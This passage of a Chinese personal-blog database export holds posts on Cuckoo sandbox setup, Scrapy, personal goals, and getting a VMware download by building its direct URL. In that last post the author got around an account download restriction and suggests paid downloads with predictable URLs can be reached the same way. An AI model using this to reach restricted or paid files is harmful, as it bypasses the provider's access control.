title=\"1. 基本运行环境\"></a>1. 基本运行环境</h3><ul>\n<li>Python</li>\n</ul>\n<p>安装Python并根据requirements.txt中的列表直接安装所需要的python模块。</p>\n<ul>\n<li>MongoDB</li>\n</ul>\n<p>如果想使用基于Django的网页接口，则需要安装MongoDB</p>\n<ul>\n<li>各个虚拟机的接口库</li>\n</ul>\n<p>KVM、XenServer的API接口</p>\n<h3 id=\"2-功能软件\"><a href=\"#2-功能软件\" class=\"headerlink\" title=\"2. 功能软件\"></a>2. 功能软件</h3><h4 id=\"安装Yara\"><a href=\"#安装Yara\" class=\"headerlink\" title=\"安装Yara\"></a>安装Yara</h4><p>Yara是一款用于识别和分类恶意样本的开源工具，可以理解为是一款特征匹配工具。</p>\n<p>Yara默认没有编译对cuckoo和magic的支持，在编译时需要加上<code>./configure --enable-cuckoo --enable-magic</code>选项。</p>\n<p>安装yara-python库，使得cuckoo能够调用yara。</p>\n<h4 id=\"安装ssdeep\"><a href=\"#安装ssdeep\" class=\"headerlink\" title=\"安装ssdeep\"></a>安装ssdeep</h4><p>ssdeep能够计算一个文件的模糊哈希代码，通过计算不同样本之间的ssdeep差值，可以判断两个样本是否相近。</p>\n<h4 id=\"Tcpdump\"><a href=\"#Tcpdump\" class=\"headerlink\" title=\"Tcpdump\"></a>Tcpdump</h4><p>用于截获数据。</p>\n<h4 id=\"安装cuckoo\"><a href=\"#安装cuckoo\" class=\"headerlink\" title=\"安装cuckoo\"></a>安装cuckoo</h4><p>cuckoo居然没有在ArchLinux的软件包中，这是很神奇的一件事，所以必须手动Github下载，并且手动更新。</p>\n<p><code>git clone git@github.com:cuckoobox/cuckoo.git</code></p>\n<h3 id=\"3-可选软件\"><a href=\"#3-可选软件\" class=\"headerlink\" title=\"3. 可选软件\"></a>3. 可选软件</h3><h3 id=\"Volatility\"><a href=\"#Volatility\" class=\"headerlink\" title=\"Volatility\"></a>Volatility</h3><p>这是一款分析内存dumps的工具。</p>\n<h3 id=\"4-安装虚拟机\"><a href=\"#4-安装虚拟机\" class=\"headerlink\" title=\"4. 安装虚拟机\"></a>4. 安装虚拟机</h3><p>Cuckoo支持多种虚拟机，官方推荐使用的是VirutalBox虚拟机（应该是因为开源的缘故），其他的还支持VMware、XenServer、ESX、KVM等虚拟机（参考modules&#x2F;machinery目录），个人处于使用惯性，选择了使用VMware。</p>\n<p>虚拟机内安装基本操作系统，取消防火墙，并安装Python运行环境，然后运行agent&#x2F;agent.py，使得虚拟机处于等待接收参数和处理任务状态，并对此状态保存快照。</p>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><h4 id=\"cuckoo-conf\"><a href=\"#cuckoo-conf\" class=\"headerlink\" title=\"cuckoo.conf\"></a>cuckoo.conf</h4><p>[cuckoo]machinery: 虚拟机类型，可以填virutalbox，vmware等</p>\n<p>[resultserver]ip port: 存储结果的服务器IP，可以直接填写本机（物理机）</p>\n<p>[database]connection: 数据库连接，不填可以直接使用SQLite数据库</p>\n<h4 id=\"auxiliary-conf\"><a href=\"#auxiliary-conf\" class=\"headerlink\" title=\"auxiliary.conf\"></a>auxiliary.conf</h4><p>主要用于监控网卡数据相关配置</p>\n<p>[sniffer]interface: 改为和虚拟机共用的网卡</p>\n<h4 id=\"vmware-conf\"><a href=\"#vmware-conf\" class=\"headerlink\" title=\"vmware.conf\"></a>vmware.conf</h4><p>具体的虚拟机设置，本例中使用vmware.conf</p>\n<p>machines: 具体的虚拟机配置，必须与下面的字段名称一致</p>\n<p>vmx_path: 表示虚拟机vmx文件的路径</p>\n<p>snapshot: 快照名称</p>\n<p>ip: 虚拟机IP地址</p>\n<h4 id=\"processing-conf\"><a href=\"#processing-conf\" class=\"headerlink\" title=\"processing.conf\"></a>processing.conf</h4><p>处理样本时需要使用各种附加模块，我禁用了Virustotal。此外，如果自己添加了模块，则需要在这个文件中启用</p>\n<h4 id=\"memory-conf\"><a href=\"#memory-conf\" class=\"headerlink\" title=\"memory.conf\"></a>memory.conf</h4><p>用于Volatility处理模块，需要首先在processing.conf启用memory模块才行。</p>\n<h4 id=\"reporting-conf\"><a href=\"#reporting-conf\" class=\"headerlink\" title=\"reporting.conf\"></a>reporting.conf</h4><p>配置报告服务器，我修改了mongodb字段，使其将数据存储到了MongoDB中</p>\n<h2 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h2><h3 id=\"启动cuckoo\"><a href=\"#启动cuckoo\" class=\"headerlink\" title=\"启动cuckoo\"></a>启动cuckoo</h3><p><code>python2 cuckoo.py</code></p>\n<p>如果失败，可以使用-d参数，输出更多的内容用于调试确认错误信息。</p>\n<h3 id=\"提交文件分析\"><a href=\"#提交文件分析\" class=\"headerlink\" title=\"提交文件分析\"></a>提交文件分析</h3><p><code>python2 utils/submit.py [文件路径] --url [网址]</code></p>\n"},{"title":"Scrapy","date":"2015-01-25T17:16:25.000Z","_content":"\n### Scrapy简介\n\nScrapy是使用Python编写的一个通用的爬虫框架。\n\n基于Twisted的异步编程框架，大幅提高了爬取效率。\n\nScrapy想来目前应该是我阅读源代码最多的开源项目了。在这个项目上，我学习到了yeild关键词，各种类的应用，接触到了一直想学习的Twisted框架。\n\n代码看起来挺简洁的，因此。\n\nScrapy 0.24.0版本的包结构有大幅改变，与之前的旧版本完全不兼容。\n\n#### Scrapy框架\n\nScrapy的框架比较难以理解，这跟\n\n### Scrapy改进\n\n#### Html解析\n\nScrapy提供了lxml的相关解析器。但是使用更好的是BeautifulSoup，虽然解析速度会便慢。\n\n#### 使用Bloom过滤器\n\n默认的网址过滤器(爬虫中的Visited表)是将一个url映射到MD5实现的。使用场景\n\n#### 利用redis构建分布式爬虫\n\n目前还没有使用过这个技术，但是其实原理非常简单，把爬虫队列存储到Redis的列表中，利用Redis的分布式数据存储功能来实现分布式队列，这样就能够在不大动Scrapy的情况下进行分布式爬取。说句实话这个思路真得很赞！\n\n","source":"_posts/Scrapy.md","raw":"title: Scrapy\ndate: 2015-01-25 17:16:25\ntags: [\"Web\"]\n---\n\n### Scrapy简介\n\nScrapy是使用Python编写的一个通用的爬虫框架。\n\n基于Twisted的异步编程框架，大幅提高了爬取效率。\n\nScrapy想来目前应该是我阅读源代码最多的开源项目了。在这个项目上，我学习到了yeild关键词，各种类的应用，接触到了一直想学习的Twisted框架。\n\n代码看起来挺简洁的，因此。\n\nScrapy 0.24.0版本的包结构有大幅改变，与之前的旧版本完全不兼容。\n\n#### Scrapy框架\n\nScrapy的框架比较难以理解，这跟\n\n### Scrapy改进\n\n#### Html解析\n\nScrapy提供了lxml的相关解析器。但是使用更好的是BeautifulSoup，虽然解析速度会便慢。\n\n#### 使用Bloom过滤器\n\n默认的网址过滤器(爬虫中的Visited表)是将一个url映射到MD5实现的。使用场景\n\n#### 利用redis构建分布式爬虫\n\n目前还没有使用过这个技术，但是其实原理非常简单，把爬虫队列存储到Redis的列表中，利用Redis的分布式数据存储功能来实现分布式队列，这样就能够在不大动Scrapy的情况下进行分布式爬取。说句实话这个思路真得很赞！\n\n","slug":"Scrapy","published":1,"updated":"2020-09-07T02:31:06.570Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmx001dxrn572nb9xf5","content":"<h3 id=\"Scrapy简介\"><a href=\"#Scrapy简介\" class=\"headerlink\" title=\"Scrapy简介\"></a>Scrapy简介</h3><p>Scrapy是使用Python编写的一个通用的爬虫框架。</p>\n<p>基于Twisted的异步编程框架，大幅提高了爬取效率。</p>\n<p>Scrapy想来目前应该是我阅读源代码最多的开源项目了。在这个项目上，我学习到了yeild关键词，各种类的应用，接触到了一直想学习的Twisted框架。</p>\n<p>代码看起来挺简洁的，因此。</p>\n<p>Scrapy 0.24.0版本的包结构有大幅改变，与之前的旧版本完全不兼容。</p>\n<h4 id=\"Scrapy框架\"><a href=\"#Scrapy框架\" class=\"headerlink\" title=\"Scrapy框架\"></a>Scrapy框架</h4><p>Scrapy的框架比较难以理解，这跟</p>\n<h3 id=\"Scrapy改进\"><a href=\"#Scrapy改进\" class=\"headerlink\" title=\"Scrapy改进\"></a>Scrapy改进</h3><h4 id=\"Html解析\"><a href=\"#Html解析\" class=\"headerlink\" title=\"Html解析\"></a>Html解析</h4><p>Scrapy提供了lxml的相关解析器。但是使用更好的是BeautifulSoup，虽然解析速度会便慢。</p>\n<h4 id=\"使用Bloom过滤器\"><a href=\"#使用Bloom过滤器\" class=\"headerlink\" title=\"使用Bloom过滤器\"></a>使用Bloom过滤器</h4><p>默认的网址过滤器(爬虫中的Visited表)是将一个url映射到MD5实现的。使用场景</p>\n<h4 id=\"利用redis构建分布式爬虫\"><a href=\"#利用redis构建分布式爬虫\" class=\"headerlink\" title=\"利用redis构建分布式爬虫\"></a>利用redis构建分布式爬虫</h4><p>目前还没有使用过这个技术，但是其实原理非常简单，把爬虫队列存储到Redis的列表中，利用Redis的分布式数据存储功能来实现分布式队列，这样就能够在不大动Scrapy的情况下进行分布式爬取。说句实话这个思路真得很赞！</p>\n","excerpt":"","more":"<h3 id=\"Scrapy简介\"><a href=\"#Scrapy简介\" class=\"headerlink\" title=\"Scrapy简介\"></a>Scrapy简介</h3><p>Scrapy是使用Python编写的一个通用的爬虫框架。</p>\n<p>基于Twisted的异步编程框架，大幅提高了爬取效率。</p>\n<p>Scrapy想来目前应该是我阅读源代码最多的开源项目了。在这个项目上，我学习到了yeild关键词，各种类的应用，接触到了一直想学习的Twisted框架。</p>\n<p>代码看起来挺简洁的，因此。</p>\n<p>Scrapy 0.24.0版本的包结构有大幅改变，与之前的旧版本完全不兼容。</p>\n<h4 id=\"Scrapy框架\"><a href=\"#Scrapy框架\" class=\"headerlink\" title=\"Scrapy框架\"></a>Scrapy框架</h4><p>Scrapy的框架比较难以理解，这跟</p>\n<h3 id=\"Scrapy改进\"><a href=\"#Scrapy改进\" class=\"headerlink\" title=\"Scrapy改进\"></a>Scrapy改进</h3><h4 id=\"Html解析\"><a href=\"#Html解析\" class=\"headerlink\" title=\"Html解析\"></a>Html解析</h4><p>Scrapy提供了lxml的相关解析器。但是使用更好的是BeautifulSoup，虽然解析速度会便慢。</p>\n<h4 id=\"使用Bloom过滤器\"><a href=\"#使用Bloom过滤器\" class=\"headerlink\" title=\"使用Bloom过滤器\"></a>使用Bloom过滤器</h4><p>默认的网址过滤器(爬虫中的Visited表)是将一个url映射到MD5实现的。使用场景</p>\n<h4 id=\"利用redis构建分布式爬虫\"><a href=\"#利用redis构建分布式爬虫\" class=\"headerlink\" title=\"利用redis构建分布式爬虫\"></a>利用redis构建分布式爬虫</h4><p>目前还没有使用过这个技术，但是其实原理非常简单，把爬虫队列存储到Redis的列表中，利用Redis的分布式数据存储功能来实现分布式队列，这样就能够在不大动Scrapy的情况下进行分布式爬取。说句实话这个思路真得很赞！</p>\n"},{"title":"ShadowBox 一个加密的容器","date":"2020-09-05T22:19:49.000Z","_content":"","source":"_posts/Shadow-Box.md","raw":"title: \"ShadowBox 一个加密的容器\"\ndate: 2020-09-05 22:19:49\ntags:\n---","slug":"Shadow-Box","published":1,"updated":"2020-09-07T02:35:07.144Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmy001fxrn5fjpt9rn3","content":"","excerpt":"","more":""},{"title":"个人学习目标","date":"2015-04-20T00:00:37.000Z","_content":"\n部门老大让我们定下自己的年度目标，以此使大家在一段时间都能够有所收获而不至于碌碌无为。作为新人，我的年度目标自然时是以学习为主，主要是读书、写博客，提高个人时间管理。\n\n## SMART原则\n\nSMART原则是制定（考核）目标时常用的黄金原则，老大在会议上也提到了。\n\n1. Specific明确性\n\n目标是具体无歧义，对于团队而言则是一致的。\n\n2. Measuable可衡量性\n\n有简单明显的指标衡量完成进度及效果\n\n3. Attainable可达到的\n\n目标不宜过于难，以免位居不前。\n\n4. Relevant相关性\n\n目标之间有相关性，这条对于此次目标制定用处不大。\n\n5. Time-bound时间截至期限\n\n有明确的截至日期，其实这和原则2有部分重复\n\n## 个人年度目标\n\n鉴于自己的严重拖延症及极差的执行力，尽量把目标定低一些，以便达到。\n\n### 总目标\n\n1. 技术类书籍平均每天3页，一周20页，两个月写一篇读书笔记。\n\n2. 一周一篇博客。\n\n3. 每天利用Evernote记录自己做的事情，并尝试总结改进。\n\n### 4月份目标\n\n1. 即日起（19日）至月底月度完毕《Effictive C++》前两个章节。\n\n2. 整理现有的博客内容，写博客一篇。\n\n","source":"_posts/Target.md","raw":"title: \"个人学习目标\"\ndate: 2015-04-20 00:00:37\ntags:\n---\n\n部门老大让我们定下自己的年度目标，以此使大家在一段时间都能够有所收获而不至于碌碌无为。作为新人，我的年度目标自然时是以学习为主，主要是读书、写博客，提高个人时间管理。\n\n## SMART原则\n\nSMART原则是制定（考核）目标时常用的黄金原则，老大在会议上也提到了。\n\n1. Specific明确性\n\n目标是具体无歧义，对于团队而言则是一致的。\n\n2. Measuable可衡量性\n\n有简单明显的指标衡量完成进度及效果\n\n3. Attainable可达到的\n\n目标不宜过于难，以免位居不前。\n\n4. Relevant相关性\n\n目标之间有相关性，这条对于此次目标制定用处不大。\n\n5. Time-bound时间截至期限\n\n有明确的截至日期，其实这和原则2有部分重复\n\n## 个人年度目标\n\n鉴于自己的严重拖延症及极差的执行力，尽量把目标定低一些，以便达到。\n\n### 总目标\n\n1. 技术类书籍平均每天3页，一周20页，两个月写一篇读书笔记。\n\n2. 一周一篇博客。\n\n3. 每天利用Evernote记录自己做的事情，并尝试总结改进。\n\n### 4月份目标\n\n1. 即日起（19日）至月底月度完毕《Effictive C++》前两个章节。\n\n2. 整理现有的博客内容，写博客一篇。\n\n","slug":"Target","published":1,"updated":"2020-09-07T02:31:06.570Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmy001hxrn55qi0h7do","content":"<p>部门老大让我们定下自己的年度目标，以此使大家在一段时间都能够有所收获而不至于碌碌无为。作为新人，我的年度目标自然时是以学习为主，主要是读书、写博客，提高个人时间管理。</p>\n<h2 id=\"SMART原则\"><a href=\"#SMART原则\" class=\"headerlink\" title=\"SMART原则\"></a>SMART原则</h2><p>SMART原则是制定（考核）目标时常用的黄金原则，老大在会议上也提到了。</p>\n<ol>\n<li>Specific明确性</li>\n</ol>\n<p>目标是具体无歧义，对于团队而言则是一致的。</p>\n<ol start=\"2\">\n<li>Measuable可衡量性</li>\n</ol>\n<p>有简单明显的指标衡量完成进度及效果</p>\n<ol start=\"3\">\n<li>Attainable可达到的</li>\n</ol>\n<p>目标不宜过于难，以免位居不前。</p>\n<ol start=\"4\">\n<li>Relevant相关性</li>\n</ol>\n<p>目标之间有相关性，这条对于此次目标制定用处不大。</p>\n<ol start=\"5\">\n<li>Time-bound时间截至期限</li>\n</ol>\n<p>有明确的截至日期，其实这和原则2有部分重复</p>\n<h2 id=\"个人年度目标\"><a href=\"#个人年度目标\" class=\"headerlink\" title=\"个人年度目标\"></a>个人年度目标</h2><p>鉴于自己的严重拖延症及极差的执行力，尽量把目标定低一些，以便达到。</p>\n<h3 id=\"总目标\"><a href=\"#总目标\" class=\"headerlink\" title=\"总目标\"></a>总目标</h3><ol>\n<li><p>技术类书籍平均每天3页，一周20页，两个月写一篇读书笔记。</p>\n</li>\n<li><p>一周一篇博客。</p>\n</li>\n<li><p>每天利用Evernote记录自己做的事情，并尝试总结改进。</p>\n</li>\n</ol>\n<h3 id=\"4月份目标\"><a href=\"#4月份目标\" class=\"headerlink\" title=\"4月份目标\"></a>4月份目标</h3><ol>\n<li><p>即日起（19日）至月底月度完毕《Effictive C++》前两个章节。</p>\n</li>\n<li><p>整理现有的博客内容，写博客一篇。</p>\n</li>\n</ol>\n","excerpt":"","more":"<p>部门老大让我们定下自己的年度目标，以此使大家在一段时间都能够有所收获而不至于碌碌无为。作为新人，我的年度目标自然时是以学习为主，主要是读书、写博客，提高个人时间管理。</p>\n<h2 id=\"SMART原则\"><a href=\"#SMART原则\" class=\"headerlink\" title=\"SMART原则\"></a>SMART原则</h2><p>SMART原则是制定（考核）目标时常用的黄金原则，老大在会议上也提到了。</p>\n<ol>\n<li>Specific明确性</li>\n</ol>\n<p>目标是具体无歧义，对于团队而言则是一致的。</p>\n<ol start=\"2\">\n<li>Measuable可衡量性</li>\n</ol>\n<p>有简单明显的指标衡量完成进度及效果</p>\n<ol start=\"3\">\n<li>Attainable可达到的</li>\n</ol>\n<p>目标不宜过于难，以免位居不前。</p>\n<ol start=\"4\">\n<li>Relevant相关性</li>\n</ol>\n<p>目标之间有相关性，这条对于此次目标制定用处不大。</p>\n<ol start=\"5\">\n<li>Time-bound时间截至期限</li>\n</ol>\n<p>有明确的截至日期，其实这和原则2有部分重复</p>\n<h2 id=\"个人年度目标\"><a href=\"#个人年度目标\" class=\"headerlink\" title=\"个人年度目标\"></a>个人年度目标</h2><p>鉴于自己的严重拖延症及极差的执行力，尽量把目标定低一些，以便达到。</p>\n<h3 id=\"总目标\"><a href=\"#总目标\" class=\"headerlink\" title=\"总目标\"></a>总目标</h3><ol>\n<li><p>技术类书籍平均每天3页，一周20页，两个月写一篇读书笔记。</p>\n</li>\n<li><p>一周一篇博客。</p>\n</li>\n<li><p>每天利用Evernote记录自己做的事情，并尝试总结改进。</p>\n</li>\n</ol>\n<h3 id=\"4月份目标\"><a href=\"#4月份目标\" class=\"headerlink\" title=\"4月份目标\"></a>4月份目标</h3><ol>\n<li><p>即日起（19日）至月底月度完毕《Effictive C++》前两个章节。</p>\n</li>\n<li><p>整理现有的博客内容，写博客一篇。</p>\n</li>\n</ol>\n"},{"title":"网址泄漏","date":"2015-01-03T14:37:26.000Z","_content":"\n这个题目起的有点意思。起因很简单，在元旦假期里面突然想折腾一下ArchLinux，装一个Vmware，结果去官网，发现我的Vmware帐号提示处于下载资格审核中，没法直接通过官网下载，而偏偏Vmware Workstation for Linux的下载非常少，或者版本不是最新的（最新的11没有32位版，其他的也普遍是8、9等），后来终于找到一个比较新的[下载地址](http://www.cnblogs.com/zc520/p/3302629.html)（10.0.0），里面提供了10.0.0的官网下载链接：\n\n![Vmware Account Locked](/img/vmware-lock.png)\n\n[http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.0-1295980.i386.bundle](http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.0-1295980.i386.bundle)\n\n虽然离最新可用32位版10.0.4稍微差点，但仍然是可用的。不过仔细观察这个链接，中间不包含任何随机字符串，因此怀疑可以构造出10.0.4的下载地址。在这个链接中最关键的就是bundle的文件名：VMware-Workstation-Full-10.0.0-1295980.i386.bundle，于是便想直接修改为VMware-Workstation-Full-10.0.4-1295980.i386.bundle，显然这种做法是错误的，因为文件名中含有一个内部版本号1295980，因此必须找到这个内部版本号才能够构造出实际的10.0.4下载地址。\n\n仔细观察[官网下载页面内容](https://my.vmware.com/group/vmware/details?downloadGroup=WKST-1004-LX&productId=362&rPId=7049#errorCheckDiv)，发现真实文件名（内部版本号）在官网上就有，据此构造出实际的10.0.4的下载地址为：\n\n[http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.4-2249910](http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.4-2249910.i386.bundle)\n\n![Vmware List](/img/vmware-list.png)\n\n## 其他的话\n\n这也不是我第一次干这种事了，基本情况就是下载网址A被大家所知道，但是下载网址B需要通过一定权限才能获取的，然后最关键的是，网址A能够推理出网址B，通常情况下网址里面包含了固定的信息，例如日期，可以直接修改得到。当然，如果有一点随机字符串，就没法获得了。\n\n这个问题相信以前国内的各种下载站都会有过，不过现在应该好多了，但是很多公司自己的软件或者付费下载可能仍然存在这样的问题。如果能够获得一个网址，例如试用版软件或者免费资源，就能够进一步推导出其他资源的网址，当然前提是文件名能够直接从网页上获取到。\n\n## 安装Vmware Workstation中的其他问题\n\n参考了很多[Wiki](https://wiki.archlinux.org/index.php/Vmware)上的内容\n\n#### 无/etc/init.d目录\n\nArchlinux的启动改为systemctl，因此不再有/etc/init.d目录，解决方法是直接忽略错误，然后手工写一个service文件就行了。\n\n#### 编译模块时出错\n\n1. 缺少header.h\n\n查看日志，发现是缺少linux头文件中的header.h，利用locate命令查找到对应的version.h文件，然后创建软链接\n\n`sudo ln /usr/include/linux/version.h /lib/modules/3.17.6-1-ARCH/build/include/linux/version.h`\n\n2. 打补丁\n\n解决了header.h之后，发现还是编译不通过，这下就傻眼了（本事不济搞不定啊！），不过通过搜索后，发现其实Arch Wiki上都写明了，安装软件[vmware-patch](https://aur.archlinux.org/packages/vmware-patch/)就行了，一看这个软件，就已经为10.0.4更新过了，**又让我对Arch产生了进一步的好感，无所不能啊！**\n\n总结就是，有问题，搜**Arch Linux英文Wiki！**\n","source":"_posts/Url-Leak.md","raw":"title: 网址泄漏\ndate: 2015-01-03 14:37:26\ntags: [\"Web\"]\n---\n\n这个题目起的有点意思。起因很简单，在元旦假期里面突然想折腾一下ArchLinux，装一个Vmware，结果去官网，发现我的Vmware帐号提示处于下载资格审核中，没法直接通过官网下载，而偏偏Vmware Workstation for Linux的下载非常少，或者版本不是最新的（最新的11没有32位版，其他的也普遍是8、9等），后来终于找到一个比较新的[下载地址](http://www.cnblogs.com/zc520/p/3302629.html)（10.0.0），里面提供了10.0.0的官网下载链接：\n\n![Vmware Account Locked](/img/vmware-lock.png)\n\n[http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.0-1295980.i386.bundle](http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.0-1295980.i386.bundle)\n\n虽然离最新可用32位版10.0.4稍微差点，但仍然是可用的。不过仔细观察这个链接，中间不包含任何随机字符串，因此怀疑可以构造出10.0.4的下载地址。在这个链接中最关键的就是bundle的文件名：VMware-Workstation-Full-10.0.0-1295980.i386.bundle，于是便想直接修改为VMware-Workstation-Full-10.0.4-1295980.i386.bundle，显然这种做法是错误的，因为文件名中含有一个内部版本号1295980，因此必须找到这个内部版本号才能够构造出实际的10.0.4下载地址。\n\n仔细观察[官网下载页面内容](https://my.vmware.com/group/vmware/details?downloadGroup=WKST-1004-LX&productId=362&rPId=7049#errorCheckDiv)，发现真实文件名（内部版本号）在官网上就有，据此构造出实际的10.0.4的下载地址为：\n\n[http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.4-2249910](http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.4-2249910.i386.bundle)\n\n![Vmware List](/img/vmware-list.png)\n\n## 其他的话\n\n这也不是我第一次干这种事了，基本情况就是下载网址A被大家所知道，但是下载网址B需要通过一定权限才能获取的，然后最关键的是，网址A能够推理出网址B，通常情况下网址里面包含了固定的信息，例如日期，可以直接修改得到。当然，如果有一点随机字符串，就没法获得了。\n\n这个问题相信以前国内的各种下载站都会有过，不过现在应该好多了，但是很多公司自己的软件或者付费下载可能仍然存在这样的问题。如果能够获得一个网址，例如试用版软件或者免费资源，就能够进一步推导出其他资源的网址，当然前提是文件名能够直接从网页上获取到。\n\n## 安装Vmware Workstation中的其他问题\n\n参考了很多[Wiki](https://wiki.archlinux.org/index.php/Vmware)上的内容\n\n#### 无/etc/init.d目录\n\nArchlinux的启动改为systemctl，因此不再有/etc/init.d目录，解决方法是直接忽略错误，然后手工写一个service文件就行了。\n\n#### 编译模块时出错\n\n1. 缺少header.h\n\n查看日志，发现是缺少linux头文件中的header.h，利用locate命令查找到对应的version.h文件，然后创建软链接\n\n`sudo ln /usr/include/linux/version.h /lib/modules/3.17.6-1-ARCH/build/include/linux/version.h`\n\n2. 打补丁\n\n解决了header.h之后，发现还是编译不通过，这下就傻眼了（本事不济搞不定啊！），不过通过搜索后，发现其实Arch Wiki上都写明了，安装软件[vmware-patch](https://aur.archlinux.org/packages/vmware-patch/)就行了，一看这个软件，就已经为10.0.4更新过了，**又让我对Arch产生了进一步的好感，无所不能啊！**\n\n总结就是，有问题，搜**Arch Linux英文Wiki！**\n","slug":"Url-Leak","published":1,"updated":"2020-09-07T02:31:06.570Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmy001kxrn5bgre7hf6","content":"<p>这个题目起的有点意思。起因很简单，在元旦假期里面突然想折腾一下ArchLinux，装一个Vmware，结果去官网，发现我的Vmware帐号提示处于下载资格审核中，没法直接通过官网下载，而偏偏Vmware Workstation for Linux的下载非常少，或者版本不是最新的（最新的11没有32位版，其他的也普遍是8、9等），后来终于找到一个比较新的<a href=\"http://www.cnblogs.com/zc520/p/3302629.html\">下载地址</a>（10.0.0），里面提供了10.0.0的官网下载链接：</p>\n<p><img src=\"/img/vmware-lock.png\" alt=\"Vmware Account Locked\"></p>\n<p><a href=\"http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.0-1295980.i386.bundle\">http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.0-1295980.i386.bundle</a></p>\n<p>虽然离最新可用32位版10.0.4稍微差点，但仍然是可用的。不过仔细观察这个链接，中间不包含任何随机字符串，因此怀疑可以构造出10.0.4的下载地址。在这个链接中最关键的就是bundle的文件名：VMware-Workstation-Full-10.0.0-1295980.i386.bundle，于是便想直接修改为VMware-Workstation-Full-10.0.4-1295980.i386.bundle，显然这种做法是错误的，因为文件名中含有一个内部版本号1295980，因此必须找到这个内部版本号才能够构造出实际的10.0.4下载地址。</p>\n<p>仔细观察<a href=\"https://my.vmware.com/group/vmware/details?downloadGroup=WKST-1004-LX&productId=362&rPId=7049#errorCheckDiv\">官网下载页面内容</a>，发现真实文件名（内部版本号）在官网上就有，据此构造出实际的10.0.4的下载地址为：</p>\n<p><a href=\"http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.4-2249910.i386.bundle\">http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.4-2249910</a></p>\n<p><img src=\"/img/vmware-list.png\" alt=\"Vmware List\"></p>\n<h2 id=\"其他的话\"><a href=\"#其他的话\" class=\"headerlink\" title=\"其他的话\"></a>其他的话</h2><p>这也不是我第一次干这种事了，基本情况就是下载网址A被大家所知道，但是下载网址B需要通过一定权限才能获取的，然后最关键的是，网址A能够推理出网址B，通常情况下网址里面包含了固定的信息，例如日期，可以直接修改得到。当然，如果有一点随机字符串，就没法获得了。</p>\n<p>这个问题相信以前国内的各种下载站都会有过，不过现在应该好多了，但是很多公司自己的软件或者付费下载可能仍然存在这样的问题。如果能够获得一个网址，例如试用版软件或者免费资源，就能够进一步推导出其他资源的网址，当然前提是文件名能够直接从网页上获取到。</p>\n<h2 id=\"安装Vmware-Workstation中的其他问题\"><a href=\"#安装Vmware-Workstation中的其他问题\" class=\"headerlink\" title=\"安装Vmware Workstation中的其他问题\"></a>安装Vmware Workstation中的其他问题</h2><p>参考了很多<a href=\"https://wiki.archlinux.org/index.php/Vmware\">Wiki</a>上的内容</p>\n<h4 id=\"无-etc-init-d目录\"><a href=\"#无-etc-init-d目录\" class=\"headerlink\" title=\"无&#x2F;etc&#x2F;init.d目录\"></a>无&#x2F;etc&#x2F;init.d目录</h4><p>Archlinux的启动改为systemctl，因此不再有&#x2F;etc&#x2F;init.d目录，解决方法是直接忽略错误，然后手工写一个service文件就行了。</p>\n<h4 id=\"编译模块时出错\"><a href=\"#编译模块时出错\" class=\"headerlink\" title=\"编译模块时出错\"></a>编译模块时出错</h4><ol>\n<li>缺少header.h</li>\n</ol>\n<p>查看日志，发现是缺少linux头文件中的header.h，利用locate命令查找到对应的version.h文件，然后创建软链接</p>\n<p><code>sudo ln /usr/include/linux/version.h /lib/modules/3.17.6-1-ARCH/build/include/linux/version.h</code></p>\n<ol start=\"2\">\n<li>打补丁</li>\n</ol>\n<p>解决了header.h之后，发现还是编译不通过，这下就傻眼了（本事不济搞不定啊！），不过通过搜索后，发现其实Arch Wiki上都写明了，安装软件<a href=\"https://aur.archlinux.org/packages/vmware-patch/\">vmware-patch</a>就行了，一看这个软件，就已经为10.0.4更新过了，<strong>又让我对Arch产生了进一步的好感，无所不能啊！</strong></p>\n<p>总结就是，有问题，搜<strong>Arch Linux英文Wiki！</strong></p>\n","excerpt":"","more":"<p>这个题目起的有点意思。起因很简单，在元旦假期里面突然想折腾一下ArchLinux，装一个Vmware，结果去官网，发现我的Vmware帐号提示处于下载资格审核中，没法直接通过官网下载，而偏偏Vmware Workstation for Linux的下载非常少，或者版本不是最新的（最新的11没有32位版，其他的也普遍是8、9等），后来终于找到一个比较新的<a href=\"http://www.cnblogs.com/zc520/p/3302629.html\">下载地址</a>（10.0.0），里面提供了10.0.0的官网下载链接：</p>\n<p><img src=\"/img/vmware-lock.png\" alt=\"Vmware Account Locked\"></p>\n<p><a href=\"http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.0-1295980.i386.bundle\">http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.0-1295980.i386.bundle</a></p>\n<p>虽然离最新可用32位版10.0.4稍微差点，但仍然是可用的。不过仔细观察这个链接，中间不包含任何随机字符串，因此怀疑可以构造出10.0.4的下载地址。在这个链接中最关键的就是bundle的文件名：VMware-Workstation-Full-10.0.0-1295980.i386.bundle，于是便想直接修改为VMware-Workstation-Full-10.0.4-1295980.i386.bundle，显然这种做法是错误的，因为文件名中含有一个内部版本号1295980，因此必须找到这个内部版本号才能够构造出实际的10.0.4下载地址。</p>\n<p>仔细观察<a href=\"https://my.vmware.com/group/vmware/details?downloadGroup=WKST-1004-LX&productId=362&rPId=7049#errorCheckDiv\">官网下载页面内容</a>，发现真实文件名（内部版本号）在官网上就有，据此构造出实际的10.0.4的下载地址为：</p>\n<p><a href=\"http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.4-2249910.i386.bundle\">http://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.4-2249910</a></p>\n<p><img src=\"/img/vmware-list.png\" alt=\"Vmware List\"></p>\n<h2 